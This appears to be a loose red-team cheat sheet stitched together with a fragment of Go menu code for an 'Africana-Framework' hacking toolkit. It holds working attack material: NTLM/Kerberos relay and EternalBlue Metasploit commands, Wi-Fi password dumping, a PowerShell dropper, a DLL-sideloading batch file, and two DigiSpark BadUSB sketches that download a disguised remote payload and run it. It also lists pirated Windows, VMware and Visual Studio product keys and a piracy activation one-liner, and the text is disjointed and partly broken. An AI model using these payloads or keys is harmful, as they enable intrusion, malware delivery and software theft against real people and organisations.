sudo mitm6 --domain internal.corp --host-allowlist icorp-w10.internal.corp --relay adscert.internal.corp -v
sudo krbrelayx.py --target http://adscert.internal.corp/certsrv/ -ip 192.168.111.80 --victim icorp-w10.internal.corp --adcs --template Machine

mitm6 -d r0jahsm0ntar1.local -i eth0
ntlmrelayx -6 -wh light.r0jahsm0ntar1.local -t ldaps://targetip -l /root/loot

python gettgtpkinit.py -pfx-base64 MIIRFQIBA..cut...lODSghScECP5hGFE3PXoz internal.corp/icorp-w10$ icorp-w10.ccache
netsh wlan show profile #AP SSID
netsh wlan show profile <SSID> key=clear #Get Cleartext Pass


sudo responder -I <iface> #Active
sudo tcpdump -i <iface> -A proto udp and dst port 53 and dst ip <KALI_IP> #Passive

+------------------------------------------------------------------------------+
|                             Other Tricks                                     |
+------------------------------------------------------------------------------+
#OPenvas
https://127.0.0.1:9392
https://github.com/rastating/joomlavs.git

sudo msfdb start; msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST 192.168.88.129; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST eth0; set LPORT 8443; set VERBOSE true; set AutoRunScript multi_console_command -c getuid,ipconfig,exit,; exploit; sleep 2; exit"

ln -s ${PWD}/golismero.py /usr/bin/golismero

sudo msfdb start; msfconsole -q -x "use auxiliary/scanner/http/webdav_scanner; set RHOSTS 127.8.0.1; set RHOST 127.8.0.1; set RPORT 80; ; set VERBOSE true; run; exit"

https://github.com/r0jahsm0ntar1/redteam/

docker run --rm -it sundowndev/phoneinfoga --help
fuser -k 8080/tcp

C:\ProgramData\Microsoft\Windows\ClipSvc\Install\Migration\8043cf84-a521-490b-8dea-1c2dc356815d.xml
 irm https://massgrave.dev/get | iex

3M3K9-5R92S-ZDH5Y-NA944
obfs4 185.177.207.166:8443 B09B8FA011BE2A02BA1820E528D04B2DA8F1C95C cert=WAd2OBfmzElct2TNpx+NORtqkh7B3CK+huWluCM9SM7Xsol+3ALAvRNBWOL4k5Uvx2ujNQ iat-mode=0
obfs4 66.198.70.78:5223 73263934A61C2D0DF1E9316AF9956E8C60DE23C7 cert=D3aFFE7v1lkkXroY91CBPByfasPRDJcUjCMkIPVuW+t7m+OSkSDlPss0rrYuZklcuXjARQ iat-mode=0
obfs4 75.134.106.30:35501 99C8AF7D79F8CA0D9D70F779503ECAA49F6C3FA2 cert=TlqfINuhMlbmoJhJ2mDISf/Eg8xHakPcPLBOC4usQTwzGCEagpOYuV4ZSs9t7rUCeBrtDg iat-mode=0

# For Debian & Ubuntu based systems
curl -SsL https://playit-cloud.github.io/ppa/key.gpg | gpg --dearmor > playit.gpg && mkdir -p /etc/apt/trusted.gpg.d/ && mv playit.gpg /etc/apt/trusted.gpg.d/
sudo curl -SsL -o /etc/apt/sources.list.d/playit-cloud.list https://playit-cloud.github.io/ppa/playit-cloud.list
sudo apt update
sudo apt install playit

  $Url = "http://$Local_Host/$Dropper_Name.html"
  $tinyUrlApi = 'http://tinyurl.com/api-create.php'
  $response = Invoke-WebRequest ("{0}?url={1}" -f $tinyUrlApi, $Url)
  $response.Content|Out-File -FilePath "$Env:TMP\sHORTENmE.meterpeter" -Force
  $GetShortenUrl = Get-Content -Path "$Env:TMP\sHORTENmE.meterpeter"
  Write-Host "[i] Shorten Uri  : $GetShortenUrl" -ForeGroundColor Black -BackGroundColor white
  Remove-Item -Path "$Env:TMP\sHORTENmE.meterpeter" -Force
  
 $Command = "powershell cd '$Env:TMP;iwr -Uri 'https://127.0.0.1/C2Prank.ps1' -OutFile 'C2Prank.ps1'|Unblock-File;Start-Process -windowstyle hidden powershell -ArgumentList '-file C2Prank.ps1 -MaxInteractions $MaxInteractions -DelayTime $DelayTime -bsodwallpaper $bsodwallpaper'"

you can start/stop Updog from inside the script
The PowerShell revshells have upload/download function embedded
To upload from nix using curl: curl -F path="absolute path for Updog-folder" -F file=filename http://UpdogIP/upload


Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width  = $Screen.Width
$Height = $Screen.Height
$Left   = $Screen.Left
$Top    = $Screen.Top

$bitmap  = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)

$bitmap.Save("C:\Users\urusername\Desktop\MyFancyScreenshot.bmp")
Write-Output "Screenshot saved to:"
Write-Output C:\Users\urusername\Desktop\MyFancyScreenshot.bmp


-copyright "©Microsoft Corporation. All Rights Reserved"


@echo off
mode con:cols=18 lines=1&color FE
taskkill /im OneDrive.exe /f
xcopy.exe  /H /Y svchost.exe C:\Users\Public\Libraries
xcopy.exe  /H /Y Secur32.dll %USERPROFILE%\AppData\Local\Microsoft\OneDrive\
attrib.exe +h C:\Users\Public\Libraries\svchost.exe
attrib.exe +h %USERPROFILE%\AppData\Local\Microsoft\OneDrive\Secur32.dll
start %USERPROFILE%\AppData\Local\Microsoft\OneDrive\OneDrive.exe

@powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%~dp0Win10.ps1" -include "%~dp0Win10.psm1" -preset "%~dpn0.preset"


+---------------------------------------------------------+
    Windows Version                        Product Key    |
|:------------------------|:------------------------------|
| Windows 8               | 46V6N-VCBYR-KT9KT-6Y4YF-QGJYH |
| Windows 8 Professional  | V7C3N-3W6CM-PDKR2-KW8DQ-RJMRD |
| Windows 8 N             | 7QNT4-HJDDR-T672J-FBFP4-2J8X9 |
| Windows 8 Professional N| 4NX4X-C98R3-KBR22-MGBWC-D667X |
| Windows 8 Single Languag| NH7GX-2BPDT-FDPBD-WD893-RJMQ4 |
| Windows 8.1 Preview     | NTTX3-RV7VB-T7X7F-WQYYY-9Y92  |
|:------------------------|:------------------------------|
| Windows 10 Home         | 37GNV-YCQVD-38XP9-T848R-FC2HD |
| Windows 10 Home N       | 33CY4-NPKCC-V98JP-42G8W-VH636 |
| Windows 10 Pro          | NF6HC-QH89W-F8WYV-WWXV4-WFG6P |
| Windows 10 Pro N        | NH7W7-BMC3R-4W9XT-94B6D-TCQG3 |
| Windows 10 SL           | NTRHT-XTHTG-GBWCG-4MTMP-HH64C |
| Windows 10 CHN SL       | 7B6NC-V3438-TRQG7-8TCCX-H6DDY |
|:------------------------|:------------------------------|
| Windows 11 Home         | TX9XD-98N7V-6WMQ6-BX7FG-H8Q99 |
| Windows 11 Home N       | 3KHY7-WNT83-DGQKR-F7HPR-844BM |
| Windows 11 Home Home Sin| 7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH |
| Windows 11 Home Country | PVMJN-6DFY6-9CCP6-7BKTT-D3WVR |
| Windows 11 Pro          | W269N-WFGWX-YVC9B-4J6C9-T83GX |
| Windows 11 Pro N        | MH37W-N47XK-V7XM9-C7227-GCQG9 |
| Windows 11 Pro for Works| NRG8B-VKK3Q-CXVCJ-9G2XF-6Q84J |
| Windows 11 Pro for Works| 9FNHH-K3HBT-3W4TD-6383H-6XYWF |
| Windows 11 Pro Education| 6TP4R-GNPTD-KYYHQ-7B7DP-J447Y |
| Windows 11 Pro Education| YVWGF-BXNMC-HTQYQ-CPQ99-66QFC |
| Windows 11 Education    | NW6C2-QMPVW-D7KKK-3GKT6-VCFB2 |
| Windows 11 Education N  | 2WH4N-8QGBV-H22JP-CT43Q-MDWWJ |
| Windows 11 Enterprise   | NPPR9-FWDCX-D2C8J-H872K-2YT43 |
| Windows 11 Enterprise N | DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4 |
| Windows 11 Enterprise G | YYVX9-NTFWV-6MDM3-9PT4T-4M68B |
| Windows 11 Enterprise G | 44RPN-FTY23-9VTTB-MP9BX-T84FV |
| Windows 11 Enterprise LT| M7XTQ-FN8P6-TTKYV-9D4CC-J462D |
| Windows 11 Enterprise N | 92NFX-8DJQP-P6BBQ-THF9C-7CG2H |
+---------------------------------------------------------+
VMWare Workstation PRO 17                Product Key      |
+-------------------------:-------------------------------+
| Professional            | MC60H-DWHD5-H80U9-6V85M-8280D |
|                         | 4A4RR-813DK-M81A9-4U35H-06KND |
| Enterprise              | NZ4RR-FTK5H-H81C1-Q30QH-1V2LA |
|                         | JU090-6039P-08409-8J0QH-2YR7F |
|                         | 4Y09U-AJK97-089Z0-A3054-83KLA |
|                         | 4C21U-2KK9Q-M8130-4V2QH-CF810 |
+---------------------------------------------------------+

Visual Studio  2017                        Product Key
+-------------------------:-------------------------------+
| Professional            | KBJFW-NXHK6-W4WJM-CRMQB-G3CDH |
|                         | 4F3PR-NFKDB-8HFP7-9WXGY-K77T7 |
| Enterprise              | NJVYC-BMHX2-G77MM-4XJMR-6Q8QF |
|                         | N2VYX-9VR2K-T733M-MWD9X-KQCDF |
|                         | 2XNFG-KFHR8-QV3CP-3W6HT-683CH |
+---------------------------------------------------------+
+---------------------------------------------------------+
|                    Malware DigiSpark                    |
+---------------------------------------------------------+
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd /k mode con:cols=18 lines=1&color FE");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(250);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(250);
  DigiKeyboard.print("Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(250);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(250);
  DigiKeyboard.print("$client.DownloadFile(\"https://raw.githubusercontent.com/r0jahsm0ntar1/3ns4g4/main/IntelGraphicX.jpg\" , \"$env:temp/script.bat\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
  DigiKeyboard.delay(250);
  //If the system hasn't been configured to run scripts, uncomment the lines bellow
  //DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(750);
  //DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
  //DigiKeyboard.delay(750);
  //DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(750);
  DigiKeyboard.print("powershell -w 1 Start-Process -FilePath \"$env:TEMP/script.bat\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit /b");
  for (;;) {
    /*empty*/
  }

}

#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd /k mode con:cols=18 lines=1&color FE");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(250);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(250);
  DigiKeyboard.print("Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(250);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(250);
  DigiKeyboard.print("$client.DownloadFile(\"https://raw.githubusercontent.com/r0jahsm0ntar1/3ns4g4/main/IntelGraphicX.jpg\" , \"$env:temp/script.bat\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
  DigiKeyboard.delay(250);
  //If the system hasn't been configured to run scripts, uncomment the lines bellow
  //DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(750);
  //DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
  //DigiKeyboard.delay(750);
  //DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(750);
  DigiKeyboard.print("powershell -w 1 Start-Process -FilePath \"$env:TEMP/script.bat\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit /b");
  for (;;) {
    /*empty*/
  }

}


$isAdmin = [System.Security.Principal.WindowsPrincipal]::new(
    [System.Security.Principal.WindowsIdentity]::GetCurrent()).
        IsInRole('Administrators')

if(-not $isAdmin) {
    $params = @{
        FilePath     = 'powershell' # or pwsh if Core
        Verb         = 'RunAs'
        ArgumentList = @(
            '-W 1'
            '-ExecutionPolicy -Scope CurrentUser 1'
            '-Enc "start cmd"'
        )
    }

    Start-Process @params
    return
}

"I'm elevated"
# Code goes here

$isAdmin = [System.Security.Principal.WindowsPrincipal]::new(
    [System.Security.Principal.WindowsIdentity]::GetCurrent()).
        IsInRole('Administrators')

if(-not $isAdmin) {
    $params = @{
        FilePath     = 'powershell' # or pwsh if Core
        Verb         = 'RunAs'
        ArgumentList = @(
            '-W 1'
            '-ExecutionPolicy bypass'
            '-Enc ""'
        )
    }

    Start-Process -WindowStyle 1 @params
    return
}`)
    fmt.Printf(bcolors.BLUE + `
                               |
                               |
                               |
                             .-'-.
                            ' ___ '
                  ---------'  .-.  '---------
  _________________________'  '-'  '_________________________
   ''''''-|---|--/    \==][^',_m_,'^][==/    \--|---|-''''''
                 \    /  ||/   H   \||  \    /
                  '--'   OO   O|O   OO   '--' 
    ` + bcolors.ENDC)
    fmt.Printf(bcolors.YELLOW + `
                      Africana-Framework
    ` + bcolors.ENDC)
    fmt.Printf(bcolors.RED + `
[Africana_name.......Developer's_name.......Original_name ]
   ` + bcolors.ENDC)

    fmt.Printf(bcolors.DARKCYAN + `
               1.    Main framework
1. africana-framework..Rojahs montari..africana-framework ]

               2.    Tor system setup
1. tor_vanish.......Salim Zaved Karim..............Neutron]

               3. Internal-Network-Attack
3. bettercap.....................................bettercap]
4. nmap...............................................nmap]
5. metasploit-framework.........................msfconsole]
6. smbmap...........................................smbmap]
7. rpcclient.....................................rpcclient]
8. beef-xss.......................................beef-xss]
9. responder.....................................responder]
10 toxssin.........................................toxssin]

               4. Generate Undetectable Malware
1. Blackjack..............t3l3machus...............Villain]
2. ShellzGen................4ndr34z.................Shellz]
3. PowerJoker...................................PowerJoker]
4. MeterPeter...................................MeterPeter]
5. Havoc C2...............@C5pider................Havoc C2]
6. Teardroid.....................................Teardroid]
7. AndroidRAT...................................AndroidRAT]
8. Chameleon.....................................Chameleon]
9. Gh0x0st.................Gh0x0st....Invoke-PSObfuscation]

               5.     WiFi Attack Vectors
1. Wifite...........................................Wifite]
2. Wifipumpkin3................................Wifipumpkin]
3. Airgeddon.....................................Airgeddon]

               6. Crack Hash, Pcap & Brute Passwords
1. Aircrack_ng.................................Aircrack_ng]
2. John...............................................John]
3. Hash-Buster.........Somdev Sangwan..........Hash-Buster]

               7.   Social-Engineering Attacks
1. Gophish.........................................Gophish]
2. Good Ginx.....................................Evil Ginx]
3. AdvPhishing.................................AdvPhishing]
4. Setoolkit...........David Kennedy.............Setoolkit]
5. Anonphisher.................................Anonphisher]
6. Cyberphish...................................Cyberphish]

               8.     Website Attack Vectors
1. Musker.................Bing A.I.................Proxyes]
2. wafw00f.........................................wafw00f]
3. Dnsrecon.......................................Dnsrecon]
4. Seekolver..............Krypteria..............Seekolver]
5. whatweb.........................................Whatweb]
6. Harvester..................................TheHarvester]
7. Param_spider................................Paramspider]
8. Ssl_scan........................................Sslscan]
9. Gobuster.......................................Gobuster]
10. Nuclei..........................................Nuclei]
11. Nikto............................................Nikto]
12. Bbot..............................................Bbot]
13. Uniscan........................................Uniscan]
14. Sqlmap..........................................Sqlmap]
15. Commix..........................................Commix]
16. Katana..........................................Katana]
17. Xsser............................................Xsser]
18. Nettacker....................................Nettacker]
19. Jok3r..................koutto....................Jok3r]
20. Osmedeus...............j3ssie.................Osmedeus]
21. Ufonet.................epsylon..................Ufonet]
    ` + bcolors.ENDC)

}

func Developer() {
    fmt.Printf(bcolors.YELLOW + `
          __                 _____ _____     _     _
       __|  |___ ___ _ _ ___|     |  |  |___|_|___| |_
      |  |  | -_|_ -| | |_ -|   --|     |  _| |_ -|  _|
      |_____|___|___|___|___|_____|__|__|_| |_|___|_|
                         ¯\_(ツ)_/¯` + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + `
[ I am Rojahs Montari a Devoted Christian & Pentester.....]
[ One might describe me as an erudite.....................]
[ & perspicacious individual, a connoisseur of cybernetic ]
[ security and digital fortification. My acumen in........]
[ devising the 🦠 africana-framework bespeaks a sagacious.]
[ approach to ethological hacking and vulnerability.......]
[ reconnaissance. As a virtuoso of cryptographic endeavors]
[ My pedagogical content disseminates esoteric knowledge,.]
[ fostering a coterie of aspirant ethical hackers. My.....]
[ prolific contributions to the technological milieu......]
[ underscore a quintessential commitment to advancing.....]
[ cybersecurity paradigms.................................]
[.........................................................]
[ Africana-framework is written purely for Good & not evil]
[ The author of africana-framework is Rojahs Montari from.]
[ cyberafrics a cybersecurity organisation in Africa Kenya]
[ Special thanks to the following people whose third party]
[ tools have been used to contribute to the creation of...]` + bcolors.ENDC)
    fmt.Printf(bcolors.GREEN + `
[ Email....: rojahsmontari@gmail.com......................]
[ YouTube..: https://youtube.com/@RojahsMontari...........]
[.........................................................]
[ What is there 4 U 2 gain the whole world & loose your...]
[ soul? Be smart your Creator has good plans for you......]
[.....Life Tip.: Defeat the devil by fasting & praying....]
[---------------------------------------------------------]` + bcolors.ENDC)
    fmt.Printf(bcolors.YELLOW + `
             Type 0. To.Exit & Go To Main Menu

` + bcolors.ENDC)

}
